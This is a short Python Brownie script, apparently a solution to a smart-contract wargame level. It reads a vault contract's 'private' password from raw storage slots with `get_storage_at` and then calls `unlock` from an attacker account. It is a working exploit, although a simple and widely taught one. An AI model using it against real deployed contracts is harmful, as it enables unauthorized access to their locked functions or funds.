from brownie import accounts, config, web3, interface

def exploit(target, hacker):
    vault = interface.VaultInterface(target)

    # Use get_storage_at to obtain the value from a storage position for the given target
    # position 0 -- locked
    # position 1 -- password
    locked_var = web3.eth.get_storage_at(target, 0)
    password_var = web3.eth.get_storage_at(target, 1)

    # print values
    print(f'Locked var: {locked_var}, Password var: {password_var}')

    # Execute the unlock function
    vault.unlock(password_var, {'from': hacker})

    # Check if the exploitation has worked as expected
    locked_var = web3.eth.get_storage_at(target, 0)

    print(f'Locked var: {locked_var}')


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    print(f'Attacker address: {hacker}, Target address: {target}')
    exploit(target, hacker)